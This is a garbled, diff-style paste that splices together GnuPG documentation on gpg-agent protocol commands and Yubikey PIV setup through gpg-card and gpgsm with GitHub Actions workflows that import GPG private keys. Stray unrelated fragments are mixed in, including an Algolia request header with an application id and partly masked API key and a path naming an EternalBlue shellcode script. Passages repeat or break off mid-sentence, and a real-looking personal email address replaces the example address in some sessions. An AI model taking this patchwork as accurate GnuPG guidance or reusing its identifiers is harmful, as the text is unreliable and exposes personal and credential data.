+  # CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE
+  !14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
+  
+       # Key added on: 2011-07-20 20:38:46
+       # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
+       34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
+private-keys-v1.d/
+gpg-connect-agent 'help COMMAND' /bye
+SETKEY <keyGrip>
+Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.
+
+  PKDECRYPT
+The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.
+
+    S: INQUIRE CIPHERTEXT
+    C: D (xxxxxx
+    C: D xxxx)
+    C: END
+Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:
+
+     (enc-val
+       (<algo>
+         (<param_name1> <mpi>)
+     ...
+         (<param_namen> <mpi>)))
+Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.
+
+If the decryption was successful the decrypted data is returned by means of "D" lines.
+
+Here is an example session:
+
+   C: PKDECRYPT
+   S: INQUIRE CIPHERTEXT
+   C: D (enc-val elg (a 349324324)
+   C: D    (b 3F444677CA)))
+   C: END
+   S: # session key follows
+   S: S PADDING 0
+   S: D (value 1234567890ABCDEF0)
+   S: OK decryption successful
+The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has
+SIGKEY <keyGrip>
+This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.
+
+   SETHASH --hash=<name>|<algo> <hexstring>
+sig-val
+       (<algo>
+         (<param_name1> <mpi>)
+     ...
+         (<param_namen> <mpi>)))
+The operation is affected by the option
+
+   OPTION use-cache-for-signing=0|1
+The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.
+
+Here is an example session:
+
+   C: SIGKEY <keyGrip>
+   S: OK key available
+   C: SIGKEY <keyGrip>
+   S: OK key available
+   C: PKSIGN
+   S: # I did ask the user whether he really wants to sign
+   S: # I did ask the user for the passphrase
+   S: INQUIRE HASHVAL
+   C: D ABCDEF012345678901234
+   C: END
+   S: # signature follows
+   S: D (sig-val rsa (s 45435453654612121212))
+   S: OK
+  GENKEY [--no-protection] [--preset] [<cache_nonce>]
+Invokes the key generation process and the server will then inquire on the generation parameters, like:
+
+   S: INQUIRE KEYPARM
+   C: D (genkey (rsa (nbits  1024)))
+   C: END
+The format of the key parameters which depends on the algorithm is of the form:
+
+    (genkey
+      (algo
+        (parameter_name_1 ....)
+          ....
+        (parameter_name_n ....)))
+If everything succeeds, the server returns the *public key* in a SPKI like S-Expression like this:
+
+     (public-key
+       (rsa
+   (n <mpi>)
+   (e <mpi>)))
+Here is an example session:
+
+   C: GENKEY
+   S: INQUIRE KEYPARM
+   C: D (genkey (rsa (nbits  1024)))
+   C: END
+   S: D (public-key
+   S: D   (rsa (n 326487324683264) (e 10001)))
+   S  OK key created
+    ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81>
+LISTTRUSTED
+GpgAgent returns a list of trusted keys line by line:
+
+    S: D 000000001234454556565656677878AF2F1ECCFF P
+    S: D 340387563485634856435645634856438576457A P
+    S: D FEDC6532453745367FD83474357495743757435D S
+    S: OK
+The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future.
+Ok
+Finally a client should be able to mark a key as trusted:
+
+   MARKTRUSTED fingerprint "P"|"S"
+The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
+
+   S: INQUIRE TRUSTDESC
+   C: D Do you trust the key with the fingerprint @FPR@
+   C: D bla fasel blurb.
+   C: END
+   S: OK
+GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
+                 [--qualitybar] cache_id                \
+                 [error_message prompt description]
+PRESET_PASSPHRASE [--inquire] <string_or_keygrip> <timeout> [<hexstring>]
+
+HAVEKEY keygrips
+  GET_CONFIRMATION description
+  LEARN [--send]
+UPDATESTARTUPTTY
+SETDATA hexstring
+
+
+  PKSIGN keyid
+
+
+  PKSIGN --hash=algoname keyid
+
+READCERT hexified_certid|keyid
+READKEY hexified_certid
+SETDATA hexstring
+d
+
+  PKSIGN keyid
+ LEARN
+
+  PKSIGN --hash=algoname keyid
+
+WRITEKEY [--force] keyid
+WRITEKEY [--force] keyid
+PASSWD [--reset] [--nullpin] chvno
+CHECKPIN idstr
+APDU [--atr] [--more] [--exlen[=n]] [hexstring]
+this:
+
+     S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+--auto-key-import 
+
+command --locate-external-key
+command --locate-external-key
+github/workflows/release.yml:
+ldap://keys.(thedomain)
+‘--auto-key-locate
+ --auto-key-locate
+--auto-key-retrieve
+
+
+ honor-keyserver-url 
+
+-sig-keyserver-url
+--recv-key
+honor-keyserver-url
+--use-agent
+--gpg-agent-info
+
+
+--no-random-seed-file
+Host: c7-use-3.algolianet. com
+Accept: */*
+Sec-Fetch-Site: cross-site
+Accept-Language: en-US, en; q=0.9
+Accept-Encoding: gzip, deflate, br
+Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B
+Origin: https://dashboard.algolia.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe
+x-algolia-api-key: b3cf*************************米**
+Content-Length: 27
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Sec-Fetch-Dest: empty
+
+scdaemon.conf
+1
+HKCU\Software\GNU\GnuPG:DefaultLogFile,
+--debug-level level
+HKCU\Software\GNU\GnuPG:DefaultLogFile,
+scd-event
+HKCU\Software\GNU\GnuPG:HomeDir
+HKCU\Software\GNU\GnuPG:DefaultLogFile,
+reader_n.status
+HKCU\Software\GNU\GnuPG:HomeDir
+
+trustlist.txt file
+gpg-agent.conf
+HKCU\Software\GNU\GnuPG:HomeDir
+name: release
+debug-pinentry 
+--debug 1024
+
+global trustlist (/usr/local/etc/gnupg/trustlist.tx
+
+Active cards
+Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers.
+gpg-connect-agent updatestartuptty /bye
+Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:
+
+gpg-connect-agent /bye
+--scdaemon-program filename
+Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf
+--check-passphrase-pattern file
+--check-sym-passphrase-pattern file
+Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg)
+bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe
+Keys listed in the sshcontrol file
+--disable-extended-key-format
+These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.
+
+--enable-ssh-support
+--enable-win32-openssh-support
+--enable-putty-support
+
+gpg-connect-agent 'GETINFO s2k_count' /bye
+gpg-connect-agent 'GETINFO s2k_time' /bye
+To view the auto-calibrated count use:
+
+gpg-connect-agent 'GETINFO s2k_count_cal' /bye
+--ssh-fingerprint-digest
+Keys listed in the sshcontrol file
+
+Active card
+gpg-connect-agent /bye
+bashrc or whatever initialization file is used for all shell invocations:
+
+GPG_TTY=$(tty)
+export GPG_TTY
+--daemon [command line]
+server
+
+agent-program file ¶
+Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.
+
+--gpg-program file
+Specify a non-default gpg binary to be used by certain commands.
+
+--gpgsm-program file
+Specify a non-default gpgsm binary to be used by certain commands.
+
+--chuid uid
+Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.
+
+gpg-card
+AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶
+AUTH
+FETCH
+GENERATE [--force] [--algo=algo{+algo2}] keyref
+KDF-SETUP ¶
+Prepare the OpenPGP card KDF feature for this card.
+
+LANG [--clear]
+Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.
+
+LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app]
+NAME [--clear]
+PRIVATEDO [--clear] n [< file] file
+READCERT [--openpgp] certref > file ¶
+Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3".
+URL [--clear]
+gpg's. --fetch 
+WRITECERT certref < file ¶
+WRITECERT --openpgp certref [< file|fpr]
+WRITECERT --clear certref
+ --openpgp
+file 
+fpr.
+WRITEKEY [--force] keyref keygrip ¶
+Write a private key object identified by keygrip to the card under the id keyref.
+CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶
+Serial number
+A hex-string with the serial number of the card.
+
+Type
+This gives the type of the card’s application. For example "OpenPGP" or "PIV".
+
+Keygrip
+A hex-string identifying a key.
+
+Keyref
+The application slot where the key is stored on the card. For example "OpenPGP.1"
+
+Status
+The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.
+
+YUBIKEY cmd args
+Various commands pertaining to Yubikey tokens with cmd being:
+
+LIST
+List supported and enabled Yubikey applications.
+
+ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all]
+DISABLE
+Enable or disable the specified or all applications on the given interface.
+
+The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.
+
+GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:
+
+Authentication key
+This is a 24 byte key described by the hex string
+010203040506070801020304050607080102030405060708.
+
+PIV Application PIN
+This is the string 123456.
+
+PIN Unblocking Key
+This is the string 12345678.
+list (the string gpg/card>
+card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: D2760001240102010006090746250000
+Application type .: OpenPGP
+Version ..........: 2.1
+[...]
+on:
+  push:
+    tags:
+      - "v*"
+
+permissions:
+  contents: write
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: cli/gh-extension-precompile@v1
+        with:
+          go_version: "1.16"
+Then
+- uses: cli/gh-extension-precompile@v1
+  env:
+    CGO_ENABLED: 1
+- uses: cli/gh-extension-precompile@v1
+  with:
+    build_script_override: "script/build.sh"
+name: release
+
+on:
+  push:
+    tags:
+      - "v*"
+
+permissions:
+  contents: write
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - id: import_gpg
+        uses: crazy-max/ghaction-import-gpg@v5
+        with:
+          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
+          passphrase: ${{ secrets.GPG_PASSPHRASE }}
+      - uses: cli/gh-extension-precompile@v1
+        with:
+          gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
+# macOS
+gpg --armor --export-secret-key joe@foo.bar | pbcopy
+
+# Ubuntu (assuming GNU base64)
+gpg --armor --export-secret-key joe@foo.bar -w0 | xclip
+
+# Arch
+gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i
+
+# FreeBSD (assuming BSD base64)
+gpg --armor --export-secret-key joe@foo.bar | xclip
+
+name: import-gpg
+
+on:
+  push:
+    branches: master
+
+jobs:
+  import-gpg:
+    runs-on: ubuntu-latest
+    steps:
+      -
+        name: Checkout
+        uses: actions/checkout@v4
+      -
+        name: Import GPG key
+        uses: crazy-max/ghaction-import-gpg@v6
+        with:
+          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
+          passphrase: ${{ secrets.PASSPHRASE }}
+      -
+        name: List keys
+        run: gpg -K
+name: import-gpg
+
+on:
+  push:
+    branches: master
 
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpg/card> writecert PIV.9D < encr.crt
+
+jobs:
+  import-gpg:
+    runs-on: ubuntu-latest
+    steps:
+      -
+        name: Checkout
+        uses: actions/checkout@v4
+      -
+        name: Import GPG key
+        uses: crazy-max/ghaction-import-gpg@v6
+        with:
+          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
+          passphrase: ${{ secrets.PASSPHRASE }}
+          fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
+      -
+        name: List keys
+        run: gpg -K
+
+pub   ed25519 2021-09-24 [C]
+      87F257B89CE462100BEC0FFE6071D218380FDCC8
+      Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
+uid           [ unknown] Joe Bar <joe@bar.foo>
+sub   ed25519 2021-09-24 [S]
+      C17D11ADF199F12A30A0910F1F80449BE0B08CB8
+      Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
+name: import-gpg
+/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add
+
+application-priority piv
+to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.
+
+With one of these methods employed the list command of gpg-card shows this:
+
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: [none]
+      keyref .....: PIV.9A
+Card authenticat. : [none]
+      keyref .....: PIV.9E
+Digital signature : [none]
+      keyref .....: PIV.9C
+Key management ...: [none]
+      keyref .....: PIV.9D
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key
+list --cards
+well. The PIV authentication key (internal reference PIV.9A
+Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption
+
+gpg/card> auth 010203040506070801020304050607080102030405060708
+gpg/card> auth < myauth.key
+
+gpg/card> generate --algo=nistp384 PIV.9A
+PIV card no. yk-9074625 detected
+gpg/card> generate --algo=nistp256 PIV.9E
+PIV card no. yk-9074625 detected
+gpg/card> generate --algo=rsa2048 PIV.9C
+PIV card no. yk-9074625 detected
+ ‘--force’
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+Key management ...: [none]
+      keyref .....: PIV.9D
+keygrip
+gpg
+self-signed X.509 certificate (exit the gpg-card tool, first):
+
+$ gpgsm --gen-key -o encr.crt
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 1
+What keysize do you want? (3072) 2048
+Requested keysize is 2048 bits
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 3
+Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> otto@example.net
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N) y
+These parameters are used:
+    Key-Type: RSA
+    Key-Length: 2048
+    Key-Usage: encrypt
+    Serial: random
+    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
+    Name-Email: otto@example.net
+
+Proceed with creation? (y/N)
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpgsm: certificate created
+Ready.
+$ gpgsm --import encr.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+Key management ...: [none]
+      keyref .....: PIV.9D
+keygrip 
+gpgsm --gen-key -o encr.crt
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 1
+What keysize do you want? (3072) 2048
+Requested keysize is 2048 bits
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 3
+Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> otto@example.net
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N) y
+These parameters are used:
+    Key-Type: RSA
+    Key-Length: 2048
+    Key-Usage: encrypt
+    Serial: random
+    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
+    Name-Email: otto@example.net
+
+Proceed with creation? (y/N)
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpgsm: certificate created
+Ready.
+$ gpgsm --import encr.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpg/card> writecert PIV.9D < encr.crt
+
+gpgsm --with-keygrip -k 6309304695z@gmail.com
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+      keyref .....: PIV.9D  (encr)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
+        user id ..: <6309304695z@gmail.com>
+
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key
+
+$ gpgsm --learn
+$ gpgsm --gen-key -o sign.crt
+Please select what kind of key you want:
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 3
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048
+Your selection? 3
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 2
+Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> 6309304695z@gmail.com
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N)
+These parameters are used:
+    Key-Type: card:PIV.9C
+    Key-Length: 1024
+    Key-Usage: sign
+    Serial: random
+    Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
+    Name-Email: 6309304695z@gmail.com
+
+Proceed with creation? (y/N) y
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED
+gpgsm: certificate created
+Ready.
+$ gpgsm --import sign.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+
+‘gpgsm --learn’
+Digital signature’ key
+gpg-card:010203040506070801020304050607080102030405060708
+
+shellcode/eternalblue_sc_merge.py
+
+gpg/card> writecert PIV.9C < sign.crt
 on:
   push:
     branches: master

AUTHENTICATE [--setkey] [--raw] [< file]|key]
AUTH and set key

GENERATE [--force] [--algo=algo{+algo2}] keyref
Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶
L

READCERT [--openpgp] certref > file ¶

openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3"

WRITECERT certref < file ¶
WRITECERT --openpgp certref [< file|fpr]
WRITECERT --clear certref
Write a certificate to the card under the id certref. 

WRITEKEY [--force] keyref keygrip ¶
Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key
—Shadowed

YUBIKEY cmd args ¶
Various commands pertaining to Yubikey tokens with cmd being:

LIST
List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all]
DISABLE
Enable or disable the specified or all applications on the given interface.

Authentication key
This is a 24 byte key described by the hex string
010203040506070801020304050607080102030405060708.

PIV

Authentication key
This is a 24 byte key described by the hex string
010203040506070801020304050607080102030405060708

the string gpg/card> is the prompt

gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: D2760001240102010006090746250000
Application type .: OpenPGP
Version ..........: 2.1
[...]

use help yubikey).

use help yubikey)

gpg/card> yubikey disable all opgp
gpg/card> yubikey list
Application  USB    NFC
-----------------------
OTP          yes    yes
U2F          yes    yes
OPGP         no     no
PIV          yes    no
OATH         yes    yes
FIDO2        yes    yes
gpg/card> reset

/.gnupg/scdaemon.conf

application-priority piv

scdaemon

gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - 3 -
PIV authentication: [none]
      keyref .....: PIV.9A
Card authenticat. : [none]
      keyref .....: PIV.9E
Digital signature : [none]
      keyref .....: PIV.9C
Key management ...: [none]
      keyref .....: PIV.9D
In

Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D)

Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key):

gpg/card> auth 010203040506070801020304050607080102030405060708

gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A
PIV card no. yk-9074625 detected
gpg/card> generate --algo=nistp256 PIV.9E
PIV card no. yk-9074625 detected
gpg/card> generate --algo=rsa2048 PIV.9C
PIV card no. yk-9074625 detected

gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - 3 -
PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
      keyref .....: PIV.9A  (auth)
      algorithm ..: nistp384
Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
      keyref .....: PIV.9E  (auth)
      algorithm ..: nistp256
Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
      keyref .....: PIV.9C  (sign,cert)
      algorithm ..: rsa2048
Key management ...: [none]
      keyref .....: PIV.9D 
—force

$ gpgsm --gen-key -o encr.crt
   (1) RSA
   (2) Existing key
   (3) Existing key from card
Your selection? 1
What keysize do you want? (3072) 2048
Requested keysize is 2048 bits
Possible actions for a RSA key:
   (1) sign, encrypt
   (2) sign
   (3) encrypt
Your selection? 3
Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
Enter email addresses (end with an empty line):
> otto@example.net
>
Enter DNS names (optional; end with an empty line):
>
Enter URIs (optional; end with an empty line):
>
Create self-signed certificate? (y/N) y
These parameters are used:
    Key-Type: RSA
    Key-Length: 2048
    Key-Usage: encrypt
    Serial: random
    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
    Name-Email: otto@example.net

Proceed with creation? (y/N)
Now creating self-signed certificate.  This may take a while ...
gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpgsm: certificate created
Ready.
$ gpgsm --import encr.crt
gpgsm: certificate imported
gpgsm: total number processed: 1
gpgsm:               imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpg/card> writecert PIV.9D < encr.crt

[...]
Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
      keyref .....: PIV.9D  (encr)
      algorithm ..: rsa2048
      used for ...: X.509
        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
        user id ..: <otto@example.net>

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/

$ gpgsm --learn
$ gpgsm --gen-key -o sign.crt
Please select what kind of key you want:
   (1) RSA
   (2) Existing key
   (3) Existing key from card
Your selection? 3
Serial number of the card: FF020001008A77C1
Available keys:
   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048
Your selection? 3
Possible actions for a RSA key:
   (1) sign, encrypt
   (2) sign
   (3) encrypt
Your selection? 2
Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE
Enter email addresses (end with an empty line):
> otto@example.net
>
Enter DNS names (optional; end with an empty line):
>
Enter URIs (optional; end with an empty line):
>
Create self-signed certificate? (y/N)
These parameters are used:
    Key-Type: card:PIV.9C
    Key-Length: 1024
    Key-Usage: sign
    Serial: random
    Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
    Name-Email: otto@example.net

Proceed with creation? (y/N) y
Now creating self-signed certificate.  This may take a while ...
gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED
gpgsm: certificate created
Ready.
$ gpgsm --import sign.crt
gpgsm: certificate imported
gpgsm: total number processed: 1
gpgsm:               imported: 1

gpg/card> writecert PIV.9C < sign.crt

Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - [verified] -
PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
      keyref .....: PIV.9A  (auth)
      algorithm ..: nistp384
Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
      keyref .....: PIV.9E  (auth)
      algorithm ..: nistp256
Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
      keyref .....: PIV.9C  (sign,cert)
      algorithm ..: rsa2048
      used for ...: X.509
        user id ..: CN=Signing key for yk-9074625,O=example,C=DE
        user id ..: <otto@example.net>
Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
      keyref .....: PIV.9D  (encr)
      algorithm ..: rsa2048
      used for ...: X.509
        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
        user id ..: <otto@example.net>

PIV authentication’ key with ssh:

$ ssh-add -l
